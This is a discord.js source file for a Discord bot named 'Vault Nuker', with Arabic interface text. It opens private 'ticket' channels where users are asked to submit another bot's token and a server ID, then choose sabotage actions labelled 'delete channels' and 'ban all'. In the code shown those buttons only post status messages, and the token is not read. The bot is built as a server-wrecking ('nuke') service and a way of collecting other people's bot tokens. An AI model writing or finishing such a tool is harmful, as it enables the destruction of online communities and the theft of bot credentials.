const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // لو الكلمة عربي أو إنجليزي
    const content = message.content.toLowerCase().trim();
    
    if (content === 'جحفلة' || content === 'nuke') {
        
        // نرد فوراً عشان نتأكد إنه شغال
        await message.reply("⏳ جاري فتح تكت الجحفلة...").catch(()=>{});

        const user = message.author;
        const guild = message.guild;

        try {
            const ticketChannel = await guild.channels.create({
                name: `nuke-${user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                ],
            });

            const embed = new EmbedBuilder()
                .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\nيرجى وضع **توكن البوت** و **ايدي السيرفر** في الاسفل، وسيتم فحص البوت. بعدها اختر نوع التخريب:")
                .setColor(0xFF0000)
                .setFooter({ text: 'Vault Blackhat' });

            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف الرومات').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
                new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setStyle(ButtonStyle.Danger).setEmoji('🔨'),
                new ButtonBuilder().setCustomId('close_ticket').setLabel('إغلاق').setEmoji('🔒').setStyle(ButtonStyle.Secondary)
            );

            await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [actionRow] });

        } catch (error) {
            console.error(error);
            message.reply('❌ حدث خطأ (تأكد من صلاحيات البوت).');
        }
    }
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    if (interaction.customId === 'close_ticket') {
        await interaction.reply({ content: '🔒 سيتم إغلاق التذكرة بعد 5 ثواني...' });
        setTimeout(() => interaction.channel.delete().catch(()=>{}), 5000);
    }
    if (interaction.customId === 'action_delete_channels') {
        await interaction.reply({ content: '🗑️ جاري الحذف...', ephemeral: true });
    }
    if (interaction.customId === 'action_ban_all') {
        await interaction.reply({ content: '🔨 جاري الطرد...', ephemeral: true });
    }
});

http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);

client.login(TOKEN);
